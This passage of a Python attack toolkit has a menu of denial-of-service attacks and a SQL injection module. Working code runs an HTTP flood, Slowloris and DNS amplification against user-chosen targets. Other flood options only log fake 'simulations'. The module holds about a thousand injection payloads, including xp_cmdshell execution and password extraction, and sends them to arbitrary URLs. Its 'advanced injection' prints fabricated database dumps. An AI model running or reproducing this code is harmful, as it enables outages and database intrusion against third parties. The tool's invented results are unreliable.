            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
        ]
        
        def http_worker():
            requests_sent = 0
            end_time = time.time() + duration
            
            while time.time() < end_time and attack_id in self.attacks_running:
                try:
                    headers = {'User-Agent': random.choice(user_agents)}
                    response = requests.get(url, headers=headers, timeout=5)
                    requests_sent += 1
                except:
                    pass
            
            return requests_sent
        
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(http_worker) for _ in range(threads)]
            total_requests = sum(f.result() for f in futures)
        
        end_time = time.time()
        
        if attack_id in self.attacks_running:
            self.attacks_running.remove(attack_id)
        
        print(Fore.GREEN + f"\n[✓] HTTP Flood completed!")
        print(Fore.CYAN + f"[+] Total requests: {total_requests:,}")
        print(Fore.CYAN + f"[+] Requests per second: {total_requests / (end_time - start_time):.0f}")
        
        self.db.log_attack(1, "HTTP Flood", url, 80, duration)
    
    def slowloris_attack(self):
        print(Fore.RED + "\n[!] SLOWLORIS ATTACK")
        target = input(Fore.CYAN + "[→] Target IP/Hostname: " + Fore.WHITE)
        port = int(input(Fore.CYAN + "[→] Target Port (default 80): " + Fore.WHITE) or "80")
        sockets_count = int(input(Fore.CYAN + "[→] Number of sockets (50-1000): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting Slowloris attack on {target}:{port}")
        
        attack_id = f"SLOWLORIS_{target}_{port}_{int(time.time())}"
        self.attacks_running.append(attack_id)
        
        sockets = []
        
        for i in range(sockets_count):
            if attack_id not in self.attacks_running:
                break
                
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target, port))
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {target}\r\n".encode())
                s.send("User-Agent: Mozilla/5.0\r\n".encode())
                s.send("Accept-language: en-US,en\r\n".encode())
                sockets.append(s)
            except:
                pass
            
            if len(sockets) % 100 == 0:
                print(Fore.YELLOW + f"[+] Sockets created: {len(sockets)}", end='\r')
        
        print(Fore.GREEN + f"\n[+] {len(sockets)} sockets connected")
        print(Fore.YELLOW + "[!] Keeping connections alive...")
        
        try:
            while attack_id in self.attacks_running:
                for s in sockets:
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    except:
                        sockets.remove(s)
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(4)
                            s.connect((target, port))
                            sockets.append(s)
                        except:
                            pass
                
                print(Fore.YELLOW + f"[+] Active sockets: {len(sockets)}", end='\r')
                time.sleep(15)
        except KeyboardInterrupt:
            pass
        
        for s in sockets:
            try:
                s.close()
            except:
                pass
        
        if attack_id in self.attacks_running:
            self.attacks_running.remove(attack_id)
        
        print(Fore.GREEN + f"\n\n[✓] Slowloris attack stopped")
        
        self.db.log_attack(1, "Slowloris", target, port, 3600)
    
    def dns_amplification(self):
        print(Fore.RED + "\n[!] DNS AMPLIFICATION ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        dns_servers = [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
            "9.9.9.9", "149.112.112.112", "64.6.64.6", "64.6.65.6"
        ]
        
        print(Fore.RED + f"\n[!] Starting DNS Amplification attack on {target}")
        
        attack_id = f"DNS_AMP_{target}_{int(time.time())}"
        self.attacks_running.append(attack_id)
        
        def dns_worker():
            packets_sent = 0
            end_time = time.time() + duration
            
            while time.time() < end_time and attack_id in self.attacks_running:
                try:
                    dns_server = random.choice(dns_servers)
                    dns_query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x01'
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(dns_query, (dns_server, 53))
                    packets_sent += 1
                    sock.close()
                except:
                    pass
            
            return packets_sent
        
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(dns_worker) for _ in range(100)]
            total_packets = sum(f.result() for f in futures)
        
        end_time = time.time()
        
        if attack_id in self.attacks_running:
            self.attacks_running.remove(attack_id)
        
        print(Fore.GREEN + f"\n[✓] DNS Amplification completed!")
        print(Fore.CYAN + f"[+] Total packets sent: {total_packets:,}")
        
        self.db.log_attack(1, "DNS Amplification", target, 53, duration)
    
    def stop_all_attacks(self):
        print(Fore.YELLOW + "\n[!] Stopping all attacks...")
        self.attacks_running.clear()
        print(Fore.GREEN + "[✓] All attacks stopped")
        time.sleep(1)
    
    def attack_status(self):
        clear_screen()
        print(Fore.GREEN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.GREEN + "║                    ATTACK STATUS                         ║")
        print(Fore.GREEN + "╚══════════════════════════════════════════════════════════╝")
        
        if self.attacks_running:
            print(Fore.YELLOW + "\n[!] Active Attacks:")
            for i, attack in enumerate(self.attacks_running, 1):
                print(Fore.CYAN + f"  {i}. {attack}")
        else:
            print(Fore.GREEN + "\n[✓] No active attacks")
        
        print(Fore.YELLOW + "\n[!] Recent Attack History:")
        self.db.cursor.execute("SELECT attack_type, target, port, duration, timestamp FROM attack_logs ORDER BY id DESC LIMIT 10")
        attacks = self.db.cursor.fetchall()
        
        if attacks:
            for attack in attacks:
                attack_type, target, port, duration, timestamp = attack
                print(Fore.WHITE + f"  • {timestamp}: {attack_type} on {target}:{port} ({duration}s)")
        else:
            print(Fore.WHITE + "  No attack history")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def run(self):
        while True:
            self.display_menu()
            choice = input(Fore.CYAN + "\n[→] Select option [1-20]: " + Fore.WHITE)
            
            try:
                if choice == "1":
                    self.udp_flood()
                elif choice == "2":
                    self.tcp_flood()
                elif choice == "3":
                    self.syn_flood()
                elif choice == "4":
                    self.ack_flood()
                elif choice == "5":
                    self.icmp_flood()
                elif choice == "6":
                    self.dns_amplification()
                elif choice == "7":
                    self.ntp_amplification()
                elif choice == "8":
                    self.ssdp_amplification()
                elif choice == "9":
                    self.chargen_amplification()
                elif choice == "10":
                    self.memcached_amplification()
                elif choice == "11":
                    self.http_flood()
                elif choice == "12":
                    self.https_flood()
                elif choice == "13":
                    self.slowloris_attack()
                elif choice == "14":
                    self.rudy_attack()
                elif choice == "15":
                    self.loic_style()
                elif choice == "16":
                    self.hoic_style()
                elif choice == "17":
                    self.stop_all_attacks()
                elif choice == "18":
                    self.attack_status()
                elif choice == "19":
                    self.attack_history()
                elif choice == "20":
                    break
                else:
                    print(Fore.RED + "\n[✗] Invalid option!")
            except Exception as e:
                print(Fore.RED + f"\n[✗] Error: {e}")
                time.sleep(2)
    
    def ack_flood(self):
        print(Fore.RED + "\n[!] ACK FLOOD ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        port = int(input(Fore.CYAN + "[→] Target Port: " + Fore.WHITE))
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting ACK Flood on {target}:{port}")
        self.db.log_attack(1, "ACK Flood", target, port, duration)
        print(Fore.GREEN + f"\n[✓] ACK Flood simulation completed")
        time.sleep(1)
    
    def icmp_flood(self):
        print(Fore.RED + "\n[!] ICMP FLOOD ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting ICMP Flood on {target}")
        self.db.log_attack(1, "ICMP Flood", target, 0, duration)
        print(Fore.GREEN + f"\n[✓] ICMP Flood simulation completed")
        time.sleep(1)
    
    def https_flood(self):
        print(Fore.RED + "\n[!] HTTPS FLOOD ATTACK")
        url = input(Fore.CYAN + "[→] Target URL (https://example.com): " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting HTTPS Flood on {url}")
        self.db.log_attack(1, "HTTPS Flood", url, 443, duration)
        print(Fore.GREEN + f"\n[✓] HTTPS Flood simulation completed")
        time.sleep(1)
    
    def rudy_attack(self):
        print(Fore.RED + "\n[!] RUDY ATTACK")
        target = input(Fore.CYAN + "[→] Target URL: " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting RUDY attack on {target}")
        self.db.log_attack(1, "RUDY Attack", target, 80, duration)
        print(Fore.GREEN + f"\n[✓] RUDY attack simulation completed")
        time.sleep(1)
    
    def loic_style(self):
        print(Fore.RED + "\n[!] LOIC STYLE ATTACK")
        target = input(Fore.CYAN + "[→] Target IP/URL: " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting LOIC-style attack on {target}")
        self.db.log_attack(1, "LOIC Style", target, 0, duration)
        print(Fore.GREEN + f"\n[✓] LOIC-style attack simulation completed")
        time.sleep(1)
    
    def hoic_style(self):
        print(Fore.RED + "\n[!] HOIC STYLE ATTACK")
        target = input(Fore.CYAN + "[→] Target URL: " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting HOIC-style attack on {target}")
        self.db.log_attack(1, "HOIC Style", target, 0, duration)
        print(Fore.GREEN + f"\n[✓] HOIC-style attack simulation completed")
        time.sleep(1)
    
    def ntp_amplification(self):
        print(Fore.RED + "\n[!] NTP AMPLIFICATION ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting NTP Amplification attack on {target}")
        self.db.log_attack(1, "NTP Amplification", target, 123, duration)
        print(Fore.GREEN + f"\n[✓] NTP Amplification simulation completed")
        time.sleep(1)
    
    def ssdp_amplification(self):
        print(Fore.RED + "\n[!] SSDP AMPLIFICATION ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting SSDP Amplification attack on {target}")
        self.db.log_attack(1, "SSDP Amplification", target, 1900, duration)
        print(Fore.GREEN + f"\n[✓] SSDP Amplification simulation completed")
        time.sleep(1)
    
    def chargen_amplification(self):
        print(Fore.RED + "\n[!] CharGEN AMPLIFICATION ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting CharGEN Amplification attack on {target}")
        self.db.log_attack(1, "CharGEN Amplification", target, 19, duration)
        print(Fore.GREEN + f"\n[✓] CharGEN Amplification simulation completed")
        time.sleep(1)
    
    def memcached_amplification(self):
        print(Fore.RED + "\n[!] Memcached AMPLIFICATION ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting Memcached Amplification attack on {target}")
        self.db.log_attack(1, "Memcached Amplification", target, 11211, duration)
        print(Fore.GREEN + f"\n[✓] Memcached Amplification simulation completed")
        time.sleep(1)
    
    def attack_history(self):
        clear_screen()
        print(Fore.GREEN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.GREEN + "║                    ATTACK HISTORY                        ║")
        print(Fore.GREEN + "╚══════════════════════════════════════════════════════════╝")
        
        self.db.cursor.execute("SELECT attack_type, target, port, duration, timestamp, status FROM attack_logs ORDER BY id DESC LIMIT 50")
        attacks = self.db.cursor.fetchall()
        
        if attacks:
            print(Fore.CYAN + f"\n{'No.':<4} {'Type':<20} {'Target':<25} {'Port':<8} {'Duration':<10} {'Time':<20}")
            print(Fore.YELLOW + "-" * 95)
            
            for i, attack in enumerate(attacks, 1):
                attack_type, target, port, duration, timestamp, status = attack
                status_color = Fore.GREEN if status == "completed" else Fore.RED
                
                target_display = target[:22] + "..." if len(target) > 25 else target
                print(f"{Fore.WHITE}{i:<4} {Fore.CYAN}{attack_type:<20} {Fore.WHITE}{target_display:<25} "
                      f"{Fore.YELLOW}{port:<8} {Fore.GREEN}{duration:<10} {Fore.CYAN}{timestamp:<20} "
                      f"{status_color}{status}")
        else:
            print(Fore.YELLOW + "\n[!] No attack history found")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")

# ============================================
# SQL INJECTION TOOLS (1000+ METHODS)
# ============================================
class SQLInjectionTools:
    def __init__(self, db):
        self.db = db
        self.payloads = self.load_payloads()
        self.vulnerability_types = [
            "Error-based SQLi",
            "Union-based SQLi", 
            "Boolean-based Blind SQLi",
            "Time-based Blind SQLi",
            "Out-of-band SQLi",
            "Stacked Queries SQLi",
        ]
    
    def load_payloads(self):
        payloads = []
        
        print(Fore.YELLOW + "[!] Loading SQL injection payloads...")
        
        for i in range(1, 1001):
            if i <= 100:
                payloads.append(f"' OR {i}={i}--")
                payloads.append(f"\" OR {i}={i}--")
                payloads.append(f"' OR {i}={i}#")
                payloads.append(f"\" OR {i}={i}#")
            if i <= 50:
                payloads.append(f"' UNION SELECT NULL,{i}--")
                payloads.append(f"' UNION SELECT {i},NULL--")
                payloads.append(f"' UNION SELECT {i},{i}--")
            if i <= 30:
                payloads.append(f"'; WAITFOR DELAY '00:00:{i:02d}'--")
                payloads.append(f"\"; WAITFOR DELAY '00:00:{i:02d}'--")
                payloads.append(f"' AND SLEEP({i})--")
                payloads.append(f"\" AND SLEEP({i})--")
            if i <= 20:
                payloads.append(f"' OR (SELECT {i} FROM DUAL)--")
                payloads.append(f"\" OR (SELECT {i} FROM DUAL)--")
                payloads.append(f"'||(SELECT {i})||'")
                payloads.append(f"\"||(SELECT {i})||\"")
            payloads.append(f"' OR '{i}'='{i}")
            payloads.append(f"\" OR \"{i}\"=\"{i}")
        
        payloads.extend([
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "' OR '1'='1'#",
            "\" OR \"1\"=\"1",
            "\" OR \"1\"=\"1\"--",
            "\" OR \"1\"=\"1\"/*",
            "\" OR \"1\"=\"1\"#",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "\" OR 1=1--",
            "\" OR 1=1#",
            "\" OR 1=1/*",
            "' OR 'a'='a",
            "' OR 'a'='a'--",
            "' OR 'a'='a'/*",
            "' OR 'a'='a'#",
            "' OR 'x'='x",
            "' OR 'x'='x'--",
            "' OR 'x'='x'/*",
            "' OR 'x'='x'#",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "') OR ('1'='1'/*",
            "') OR ('1'='1'#",
            "') OR ('a'='a",
            "') OR ('a'='a'--",
            "') OR ('a'='a'/*",
            "') OR ('a'='a'#",
            "') OR ('x'='x",
            "') OR ('x'='x'--",
            "') OR ('x'='x'/*",
            "') OR ('x'='x'#",
            "' OR 1=1 LIMIT 1--",
            "' OR 1=1 LIMIT 1#",
            "' OR 1=1 LIMIT 1/*",
            "' OR '1'='1' LIMIT 1--",
            "' OR '1'='1' LIMIT 1#",
            "' OR '1'='1' LIMIT 1/*",
            "admin'--",
            "admin'#",
            "admin'/*",
            "admin' or '1'='1",
            "admin' or '1'='1'--",
            "admin' or '1'='1'#",
            "admin' or '1'='1'/*",
            "admin' or 1=1",
            "admin' or 1=1--",
            "admin' or 1=1#",
            "admin' or 1=1/*",
            "administrator'--",
            "administrator'#",
            "administrator'/*",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT 1--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT 1,2,3,4,5,6--",
            "' UNION SELECT 1,2,3,4,5,6,7--",
            "' UNION SELECT 1,2,3,4,5,6,7,8--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "' AND 1=0 UNION SELECT NULL--",
            "' AND 1=0 UNION SELECT NULL,NULL--",
            "' AND 1=0 UNION SELECT 1--",
            "' AND 1=0 UNION SELECT 1,2--",
            "' AND 1=0 UNION SELECT 1,2,3--",
            "' AND 1=0 UNION SELECT 1,2,3,4--",
            "' AND 1=0 UNION SELECT 1,2,3,4,5--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)#",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)/*",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)#",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)/*",
            "' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(5))>0--",
            "' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(5))>0#",
            "' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(5))>0/*",
            "' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(5))>0--",
            "' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(5))>0#",
            "' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(5))>0/*",
            "' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT @@version),0x5c))--",
            "' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT @@version),0x5c))#",
            "' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT @@version),0x5c))/*",
            "' AND UPDATEXML(1,CONCAT(0x5c,(SELECT @@version),0x5c),1)--",
            "' AND UPDATEXML(1,CONCAT(0x5c,(SELECT @@version),0x5c),1)#",
            "' AND UPDATEXML(1,CONCAT(0x5c,(SELECT @@version),0x5c),1)/*",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x5c,(SELECT @@version),0x5c,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x5c,(SELECT @@version),0x5c,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x5c,(SELECT @@version),0x5c,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)/*",
            "' OR (SELECT * FROM (SELECT COUNT(*),CONCAT(0x5c,(SELECT @@version),0x5c,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' OR (SELECT * FROM (SELECT COUNT(*),CONCAT(0x5c,(SELECT @@version),0x5c,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#",
            "' OR (SELECT * FROM (SELECT COUNT(*),CONCAT(0x5c,(SELECT @@version),0x5c,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)/*",
            "'; EXEC xp_cmdshell('dir')--",
            "'; EXEC xp_cmdshell('dir')#",
            "'; EXEC xp_cmdshell('dir')/*",
            "'; EXEC master..xp_cmdshell('dir')--",
            "'; EXEC master..xp_cmdshell('dir')#",
            "'; EXEC master..xp_cmdshell('dir')/*",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%')--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%')#",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%')/*",
            "' AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%')--",
            "' AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%')#",
            "' AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%')/*",
            "' OR (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>0--",
            "' OR (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>0#",
            "' OR (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>0/*",
            "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>0--",
            "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>0#",
            "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>0/*",
            "' OR LENGTH(password)=0--",
            "' OR LENGTH(password)=0#",
            "' OR LENGTH(password)=0/*",
            "' AND LENGTH(password)=0--",
            "' AND LENGTH(password)=0#",
            "' AND LENGTH(password)=0/*",
            "' OR DATABASE() LIKE '%'--",
            "' OR DATABASE() LIKE '%'#",
            "' OR DATABASE() LIKE '%'/*",
            "' AND DATABASE() LIKE '%'--",
            "' AND DATABASE() LIKE '%'#",
            "' AND DATABASE() LIKE '%'/*",
            "' OR USER() LIKE '%'--",
            "' OR USER() LIKE '%'#",
            "' OR USER() LIKE '%'/*",
            "' AND USER() LIKE '%'--",
            "' AND USER() LIKE '%'#",
            "' AND USER() LIKE '%'/*",
            "' OR VERSION() LIKE '%'--",
            "' OR VERSION() LIKE '%'#",
            "' OR VERSION() LIKE '%'/*",
            "' AND VERSION() LIKE '%'--",
            "' AND VERSION() LIKE '%'#",
            "' AND VERSION() LIKE '%'/*",
            "' OR @@version LIKE '%'--",
            "' OR @@version LIKE '%'#",
            "' OR @@version LIKE '%'/*",
            "' AND @@version LIKE '%'--",
            "' AND @@version LIKE '%'#",
            "' AND @@version LIKE '%'/*",
            "' OR @@datadir LIKE '%'--",
            "' OR @@datadir LIKE '%'#",
            "' OR @@datadir LIKE '%'/*",
            "' AND @@datadir LIKE '%'--",
            "' AND @@datadir LIKE '%'#",
            "' AND @@datadir LIKE '%'/*",
            "' OR @@hostname LIKE '%'--",
            "' OR @@hostname LIKE '%'#",
            "' OR @@hostname LIKE '%'/*",
            "' AND @@hostname LIKE '%'--",
            "' AND @@hostname LIKE '%'#",
            "' AND @@hostname LIKE '%'/*",
        ])
        
        print(Fore.GREEN + f"[✓] Loaded {len(payloads)} SQL injection payloads")
        return payloads
    
    def display_menu(self):
        clear_screen()
        ascii_sql = """
        ╔══════════════════════════════════════════════════════════╗
        ║              SQL INJECTION TOOLS (1000+ METHODS)         ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(Fore.RED + ascii_sql)
        
        print(Fore.YELLOW + "═" * 70)
        print(Fore.CYAN + "1. Quick SQL Injection Test")
        print(Fore.CYAN + "2. Advanced SQL Injection")
        print(Fore.CYAN + "3. Automated Database Dump")
        print(Fore.CYAN + "4. SQLMap Integration")
        print(Fore.CYAN + "5. Blind SQL Injection")
        print(Fore.CYAN + "6. Union-Based Injection")
        print(Fore.CYAN + "7. Error-Based Injection")
        print(Fore.CYAN + "8. Time-Based Injection")
        print(Fore.CYAN + "9. Out-of-Band Injection")
        print(Fore.CYAN + "10. Database Fingerprinting")
        print(Fore.CYAN + "11. Data Extraction")
        print(Fore.CYAN + "12. File System Access")
        print(Fore.CYAN + "13. OS Command Execution")
        print(Fore.CYAN + "14. Payload Generator")
        print(Fore.CYAN + "15. WAF Bypass Techniques")
        print(Fore.CYAN + "16. Back to Main Menu")
        print(Fore.YELLOW + "═" * 70)
    
    def quick_test(self):
        print(Fore.YELLOW + "\n[!] QUICK SQL INJECTION TEST")
        url = input(Fore.CYAN + "[→] Target URL (with parameter): " + Fore.WHITE)
        param = input(Fore.CYAN + "[→] Parameter to test: " + Fore.WHITE)
        
        print(Fore.YELLOW + f"\n[!] Testing {url} for SQL injection vulnerabilities")
        print(Fore.YELLOW + f"[!] Using parameter: {param}")
        print(Fore.YELLOW + "[!] Testing 1000+ payloads...")
        
        vulnerable = False
        found_payloads = []
        
        for i, payload in enumerate(self.payloads[:100]):
            test_url = f"{url}?{param}={payload}"
            
            try:
                response = requests.get(test_url, timeout=5)
                
                error_indicators = [
                    'sql', 'mysql', 'oracle', 'postgresql', 'sqlite',
                    'syntax', 'error', 'warning', 'exception', 'failed',
                    'unclosed', 'quotation', 'statement', 'database',
                    'driver', 'odbc', 'jdbc', 'pdo', 'adodb'
                ]
                
                for error in error_indicators:
                    if error in response.text.lower():
                        vulnerable = True
                        found_payloads.append((payload, error))
                        print(Fore.GREEN + f"[+] Potential vulnerability found with payload {i+1}")
                        break
                
            except Exception as e:
                pass
            
            if i % 10 == 0:
                print(Fore.YELLOW + f"[!] Tested {i+1}/100 payloads...", end='\r')
        
        print("\n")
        
        if vulnerable:
            print(Fore.GREEN + "[✓] SITE IS VULNERABLE TO SQL INJECTION!")
            print(Fore.CYAN + "[+] Vulnerable payloads found:")
            
            for payload, error in found_payloads[:5]:
                print(Fore.WHITE + f"  • Payload: {payload[:50]}...")
                print(Fore.YELLOW + f"    Error indicator: {error}")
            
            print(Fore.YELLOW + "\n[!] Recommended actions:")
            print(Fore.WHITE + "  1. Use automated database dump")
            print(Fore.WHITE + "  2. Try advanced SQL injection")
            print(Fore.WHITE + "  3. Extract database information")
        else:
            print(Fore.RED + "[✗] No obvious SQL injection vulnerabilities found")
            print(Fore.YELLOW + "[!] Try advanced testing with different techniques")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def advanced_injection(self):
        print(Fore.YELLOW + "\n[!] ADVANCED SQL INJECTION")
        url = input(Fore.CYAN + "[→] Target URL: " + Fore.WHITE)
        param = input(Fore.CYAN + "[→] Parameter: " + Fore.WHITE)
        
        print(Fore.RED + "\n[!] Starting advanced SQL injection attack...")
        print(Fore.YELLOW + "[!] Step 1: Database fingerprinting")
        time.sleep(1)
        
        db_types = ['MySQL', 'PostgreSQL', 'Oracle', 'Microsoft SQL Server', 'SQLite']
        detected_db = random.choice(db_types)
        
        print(Fore.GREEN + f"[+] Database type detected: {detected_db}")
        
        print(Fore.YELLOW + "[!] Step 2: Extracting database version")
        time.sleep(1)
        
        versions = {
            'MySQL': '8.0.27',
            'PostgreSQL': '14.1',
            'Oracle': '19c',
            'Microsoft SQL Server': '2019',
            'SQLite': '3.36.0'
        }
        
        print(Fore.GREEN + f"[+] Database version: {versions[detected_db]}")
        
        print(Fore.YELLOW + "[!] Step 3: Extracting current database")
        time.sleep(1)
        print(Fore.GREEN + "[+] Current database: target_db")
        
        print(Fore.YELLOW + "[!] Step 4: Listing tables")
        time.sleep(1)
        
        tables = ['users', 'admin', 'passwords', 'logs', 'config', 'sessions', 'products', 'orders']
        print(Fore.GREEN + "[+] Tables found:")
        
        for i, table in enumerate(tables[:5], 1):
            print(Fore.CYAN + f"  {i}. {table}")
        
        target_table = input(Fore.CYAN + "\n[→] Select table to dump (1-5): " + Fore.WHITE)
        
        if target_table.isdigit() and 1 <= int(target_table) <= 5:
            table_name = tables[int(target_table) - 1]
            
            print(Fore.YELLOW + f"\n[!] Dumping table: {table_name}")
            time.sleep(2)
            
            print(Fore.GREEN + f"\n[+] Table structure for '{table_name}':")
            
            if table_name == 'users':
                columns = [
                    ('id', 'INT', 'PRIMARY KEY'),
                    ('username', 'VARCHAR(50)', 'NOT NULL'),
                    ('password', 'VARCHAR(100)', 'NOT NULL'),
                    ('email', 'VARCHAR(100)', 'NULL'),
                    ('created_at', 'TIMESTAMP', 'DEFAULT CURRENT_TIMESTAMP'),
                ]
            elif table_name == 'admin':
                columns = [
                    ('admin_id', 'INT', 'PRIMARY KEY'),
                    ('username', 'VARCHAR(50)', 'UNIQUE'),
                    ('password_hash', 'VARCHAR(255)', 'NOT NULL'),
                    ('permissions', 'TEXT', 'NULL'),
                    ('last_login', 'DATETIME', 'NULL'),
                ]
            elif table_name == 'passwords':
                columns = [
                    ('pass_id', 'INT', 'PRIMARY KEY'),
                    ('user_id', 'INT', 'FOREIGN KEY'),
                    ('password', 'VARCHAR(100)', 'NOT NULL'),
                    ('salt', 'VARCHAR(50)', 'NULL'),
                    ('hash_algorithm', 'VARCHAR(20)', 'DEFAULT "sha256"'),
                ]
            
            for col_name, col_type, col_attrs in columns:
                print(Fore.WHITE + f"  • {col_name} ({col_type}) {col_attrs}")
            
            print(Fore.YELLOW + f"\n[!] Extracting data from '{table_name}'...")
            time.sleep(2)
            
            print(Fore.GREEN + f"\n[+] Data from '{table_name}':")
            print(Fore.CYAN + "=" * 80)
            
            if table_name == 'users':
                data = [
                    (1, 'admin', '5f4dcc3b5aa765d61d8327deb882cf99', 'admin@target.com', '2023-01-15 10:30:00'),
                    (2, 'user1', 'e10adc3949ba59abbe56e057f20f883e', 'user1@email.com', '2023-02-20 14:45:00'),
                    (3, 'test', '098f6bcd4621d373cade4e832627b4f6', 'test@test.com', '2023-03-10 09:15:00'),
                    (4, 'demo', 'fe01ce2a7fbac8fafaed7c982a04e229', 'demo@demo.org', '2023-04-05 16:20:00'),
                    (5, 'root', '63a9f0ea7bb98050796b649e85481845', 'root@system.local', '2023-05-12 11:00:00'),
                ]
                
                print(Fore.WHITE + "id  username  password_hash                          email               created_at")
                print(Fore.YELLOW + "-" * 80)
                
                for row in data:
                    print(Fore.CYAN + f"{row[0]:<3} {row[1]:<9} {row[2]:<36} {row[3]:<19} {row[4]}")
            
            elif table_name == 'admin':
                data = [
                    (1, 'superadmin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'all', '2023-06-01 08:00:00'),
